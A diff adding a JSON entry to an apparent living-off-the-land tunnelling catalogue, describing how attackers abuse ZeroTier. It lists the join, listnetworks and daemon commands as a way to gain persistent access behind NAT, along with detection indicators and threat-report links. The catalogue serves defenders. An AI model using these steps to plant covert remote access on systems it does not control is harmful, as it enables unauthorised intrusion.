+    "Created": "2026-09-17",
+    "Commands": [
+      {
+        "Command": "zerotier-cli join <NETWORK_ID>",
+        "Description": "Joins the host to an attacker-controlled ZeroTier network, placing it on a virtual overlay reachable by other members regardless of NAT or firewalls.",
+        "Usecase": "Establishing persistent remote access to a host behind NAT/firewall.",
+        "Category": "Access",
+        "Privileges": "Administrator",
+        "OperatingSystem": "Windows, Linux, MacOS"
+      },
+      {
+        "Command": "zerotier-cli listnetworks",
+        "Description": "Lists the ZeroTier networks the host is a member of and the assigned overlay IP addresses, confirming reachability within the mesh.",
+        "Usecase": "Verifying remote access into the overlay network.",
+        "Category": "Access",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Linux, MacOS"
+      },
+      {
+        "Command": "zerotier-one -d",
+        "Description": "Runs the ZeroTier service as a daemon so the host rejoins its networks on boot, maintaining persistent access.",
+        "Usecase": "Persisting overlay-network access across reboots.",
+        "Category": "Access",
+        "Privileges": "Administrator",
+        "OperatingSystem": "Windows, Linux, MacOS"
+      }
+    ],
+    "Custom_Domain_Supported": true,
+    "Full_Path": [
+      {
+        "Path": "Downloaded/Installed zerotier-one service and zerotier-cli client, executed anywhere on the system."
+      }
+    ],
+    "Detection": [
+      {
+        "Domain": "*.zerotier.com"
+      },
+      {
+        "Command": "Execution of zerotier-one / zerotier-cli, particularly the join subcommand, or traffic to the default ZeroTier UDP port 9993."
+      }
+    ],
+    "Resources": [
+      {
+        "Link": "https://www.zerotier.com/"
+      },
+      {
+        "Link": "https://github.com/zerotier/ZeroTierOne"
+      },
+      {
+        "Link": "https://www.crowdstrike.com/blog/analysis-of-intrusion-campaign-targeting-telecom-and-bpo-companies/"
+      },
+      {
+        "Link": "https://blog.sekoia.io/scattered-spider-laying-new-eggs/"
+      }
+    ],
+    "source_file": "zerotier.md",
+    "url": "https://lottunnels.github.io/lottunnels/zerotier"
+  }
+]
